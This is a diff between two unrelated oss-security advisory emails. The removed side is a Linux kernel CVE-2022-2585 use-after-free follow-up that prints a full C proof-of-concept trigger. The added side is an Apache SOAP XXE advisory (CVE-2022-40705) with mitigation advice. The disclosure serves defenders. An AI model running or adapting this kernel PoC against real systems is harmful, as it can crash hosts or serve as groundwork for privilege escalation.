@@ -1,79 +1,25 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/08/18/3
-Message-ID: <Yv1Pry60yZ6mOscO@quatroqueijos>
-Date: Wed, 17 Aug 2022 17:29:35 -0300
-From: Thadeu Lima de Souza Cascardo <cascardo@...onical.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/09/22/1
+Message-ID: <b6dccca1-9e43-d746-f832-6767ab0d3d03@apache.org>
+Date: Thu, 22 Sep 2022 08:07:35 +0000
+From: Arnout Engelen <engelen@...che.org>
 To: oss-security@...ts.openwall.com
-Subject: Re: CVE-2022-2585 - Linux kernel POSIX CPU timer UAF
+Subject: CVE-2022-40705: Apache SOAP: XML External Entity Injection (XXE) allows unauthenticated users to read arbitrary files via HTTP 
 Content-Type: text/plain; charset=utf-8
 
-On Tue, Aug 09, 2022 at 02:13:40PM -0300, Thadeu Lima de Souza Cascardo wrote:
-> CVE-2022-2585 - Linux kernel POSIX CPU timer UAF
-> 
-> It was discovered that when exec'ing from a non-leader thread, armed POSIX
-> CPU timers would be left on a list but freed, leading to a use-after-free.
-> 
-> An independent security researcher working with SSD Secure Disclosure
-> discovered that this vulnerability could be exploited for Local Privilege
-> Escalation.
-> 
-> This bug was introduced by commit 55e8c8eb2c7b ("posix-cpu-timers: Store a
-> reference to a pid not a task"), which is present since v5.7-rc1.
-> 
-> This has been assigned CVE-2022-2585.
-> 
-> A PoC that will trigger KASAN is going to be posted in a week.
-> 
-> A fix has been sent to linux-kernel@...r.kernel.org and is at
-> https://lore.kernel.org/lkml/20220809170751.164716-1-cascardo@canonical.com/T/#u.
+Severity: important
 
-This has been merged as commit e362359ace6f87c201531872486ff295df306d13.
+Description:
 
-The PoC should be built with the name poc as that is what it tries to exec.
+** UNSUPPORTED WHEN ASSIGNED ** An Improper Restriction of XML External Entity Reference vulnerability in RPCRouterServlet of Apache SOAP allows an attacker to read arbitrary files over HTTP. This issue affects Apache SOAP version 2.2 and later versions. It is unknown whether previous versions are also affected.  NOTE: This vulnerability only affects products that are no longer supported by the maintainer.
 
-#define _GNU_SOURCE
-#include <sched.h>
-#include <time.h>
-#include <unistd.h>
-#include <sys/wait.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/mman.h>
+Mitigation:
 
-static int timer_uaf(void *d)
-{
-	timer_t tid;
-	struct itimerspec its;
+We do not expect to release a version that fixes this problem. Instead, we recommend users to migrate to one of the other actively maintained web service stacks such as Apache CXF (https://cxf.apache.org) or Apache Axis (https://axis.apache.org).
 
-	its.it_interval.tv_sec = 3;
-	its.it_interval.tv_nsec = 0;
-	its.it_value.tv_sec = 3;
-	its.it_value.tv_nsec = 0;
-	timer_create(CLOCK_THREAD_CPUTIME_ID, NULL, &tid);
-	timer_settime(tid, 0, &its, NULL);
-	execlp("./poc", "poc1", NULL);
-}
+Apache SOAP is an archived project, with the last release published in 2003. This means it is no longer maintained, does not receive updates, and we do not commit to publishing CVE's for security problems in this project. This advisory is published purely as a courtesy.
 
-static char stack[8192];
+Credit:
 
-int main(int argc, char **argv)
-{
-	timer_t tid;
-	int i;
+Apache would like to thank TsungShu Chiu (CHT Security) for reporting this issue
 
-	if (!strcmp(argv[0], "poc1")) {
-		sleep(2);
-		exit(0);
-	}
-
-	if (fork() > 0) {
-		waitpid(-1, NULL, 0);
-		exit(0);
-	}
-
-	clone(timer_uaf, stack+4096, SIGCHLD | CLONE_VM | CLONE_SIGHAND | CLONE_THREAD, NULL, NULL, NULL);
-
-	while(1);
-
-	return 0;
-}
